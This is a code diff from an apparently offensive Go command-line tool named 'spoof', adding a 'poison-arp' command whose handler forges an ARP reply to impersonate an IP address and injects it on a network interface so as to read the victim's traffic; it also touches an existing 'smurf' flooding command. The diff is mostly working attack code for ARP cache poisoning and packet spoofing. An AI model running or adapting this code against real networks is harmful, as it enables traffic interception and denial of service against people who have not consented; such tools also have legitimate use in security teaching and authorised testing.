@@ -3,11 +3,12 @@ package app
 import (
 	"encoding/hex"
 	"fmt"
-	"github.com/adrianosela/spoof/payloads"
-	"github.com/adrianosela/spoof/wire"
 	"log"
 	"net"
 	"time"
+
+	"github.com/adrianosela/spoof/payloads"
+	"github.com/adrianosela/spoof/wire"
 
 	"github.com/pkg/errors"
 	cli "gopkg.in/urfave/cli.v1"
@@ -35,10 +36,14 @@ var commands = []cli.Command{
 				Name:    "poison-arp",
 				Aliases: []string{"a"},
 				Usage:   "poison (spoof) a host's arp cache and read their traffic",
-				Flags:   []cli.Flag{
-					// TODO: flags
+				Flags: []cli.Flag{
+					asMandatory(srcIPFlag),
+					asMandatory(dstIPFlag),
+					asMandatory(dstMACFlag),
+					withDefault(ifaceFlag, "en0"),
 				},
-				// TODO: before and action
+				Before: arpPoisonValidator,
+				Action: arpPoisonHandler,
 			},
 		},
 	},
@@ -68,7 +73,7 @@ var commands = []cli.Command{
 }
 
 func smurfValidator(ctx *cli.Context) error {
-	return assertSet(ctx, targetFlag)
+	return assertSet(ctx, targetFlag, dstMACFlag)
 }
 
 func smurfHandler(ctx *cli.Context) error {
@@ -112,6 +117,49 @@ func smurfHandler(ctx *cli.Context) error {
 			log.Println(err)
 		}
 	})
+
+	return nil
+}
+
+func arpPoisonValidator(ctx *cli.Context) error {
+	return assertSet(ctx, srcIPFlag, dstIPFlag, dstMACFlag)
+}
+
+func arpPoisonHandler(ctx *cli.Context) error {
+	srcIP := net.ParseIP(ctx.String(name(srcIPFlag)))
+	if srcIP == nil {
+		return errors.New("invalid source IP address")
+	}
+
+	dstIP := net.ParseIP(ctx.String(name(dstIPFlag)))
+	if dstIP == nil {
+		return errors.New("invalid destination IP address")
+	}
+
+	dstMAC, err := net.ParseMAC(ctx.String(name(dstMACFlag)))
+	if err != nil {
+		return errors.Wrap(err, "invalid destination MAC address")
+	}
+
+	w, err := wire.NewWire(ctx.String(name(ifaceFlag)))
+	if err != nil {
+		return err
+	}
+	defer w.Close()
+
+	payload, err := payloads.Build(payloads.TypeARPReply, payloads.Config{
+		SrcIP:  srcIP,   // the ip we are impersonating
+		SrcMAC: w.MAC(), // advertised MAC i.e. **this** interface
+		DstIP:  dstIP,   // ip of host having its arp cache poisoned
+		DstMAC: dstMAC,  // mac of host having its arp cache poisoned
+	})
+	if err != nil {
+		return errors.Wrap(err, "could not build payload")
+	}
+
+	if err = w.Inject(payload); err != nil {
+		return errors.Wrap(err, "failed to inject payload")
+	}
 
 	return nil
 }
